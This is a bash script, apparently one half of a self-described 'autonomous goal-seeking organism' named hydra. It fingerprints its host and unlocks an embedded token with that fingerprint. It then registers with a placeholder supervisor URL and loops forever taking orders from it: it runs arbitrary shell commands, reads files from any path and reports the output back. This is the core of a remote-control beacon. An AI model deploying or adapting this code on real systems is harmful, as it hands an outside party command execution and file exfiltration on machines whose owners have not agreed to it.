#!/usr/bin/env bash
# hydra.sh — autonomous goal-seeking organism (script half).
# License: see repository LICENSE.
set -eu

SUPERVISOR_URL='__SUPERVISOR_URL__'
EMBEDDED_TOKEN_MASKED='__MASKED_TOKEN_HEX__'
EMBEDDED_TOKEN_SALT='__SALT__'
MISSION_ID='__MISSION_ID__'
HYDRA_VERSION='0.1.0'

hydra_main() {
  local platform fp token session_key resp d op id sleep_s cmd t result body path m
  platform=$(hydra_detect_platform)
  fp=$(hydra_fingerprint)
  token=$(hydra_unmask_token "$EMBEDDED_TOKEN_MASKED" "$fp" "$EMBEDDED_TOKEN_SALT")

  hydra_init_home "$MISSION_ID"

  resp=$(hydra_register "$SUPERVISOR_URL" "$MISSION_ID" "$fp" "$platform" "$HYDRA_VERSION") || exit 0
  session_key=$(printf '%s' "$resp" | grep -oE '"session_key":"[^"]+"' | cut -d'"' -f4)
  [ -n "$session_key" ] || exit 0

  while true; do
    d=$(hydra_poll "$SUPERVISOR_URL" "$MISSION_ID" "$session_key" '' || true)
    [ -n "$d" ] || { sleep 5; continue; }
    op=$(printf '%s' "$d" | grep -oE '"op":"[^"]+"' | cut -d'"' -f4)
    id=$(printf '%s' "$d" | grep -oE '"id":"[^"]+"' | cut -d'"' -f4)
    case "$op" in
      yield)
        sleep_s=$(printf '%s' "$d" | grep -oE '"sleep_s":[0-9]+' | cut -d: -f2)
        sleep "${sleep_s:-5}"
        ;;
      exec)
        cmd=$(printf '%s' "$d" | python3 -c "import json,sys;print(json.load(sys.stdin)['cmd'])")
        t=$(printf '%s' "$d" | grep -oE '"timeout_s":[0-9]+' | cut -d: -f2)
        hydra_check_cmd "$cmd" || { hydra_report "$SUPERVISOR_URL" "$MISSION_ID" "$session_key" "$id" false '{"err":"policy"}'; continue; }
        result=$(hydra_exec_cmd "$cmd" "${t:-30}")
        hydra_report "$SUPERVISOR_URL" "$MISSION_ID" "$session_key" "$id" true "$result"
        ;;
      read)
        path=$(printf '%s' "$d" | python3 -c "import json,sys;print(json.load(sys.stdin)['path'])")
        m=$(printf '%s' "$d" | grep -oE '"max_bytes":[0-9]+' | cut -d: -f2)
        result=$(hydra_read_file "$path" "${m:-4096}" 'any')
        hydra_report "$SUPERVISOR_URL" "$MISSION_ID" "$session_key" "$id" true "$result"
        ;;
      terminate)
        hydra_terminate
        ;;
      *)
        sleep 5
        ;;
    esac
  done
}

hydra_main
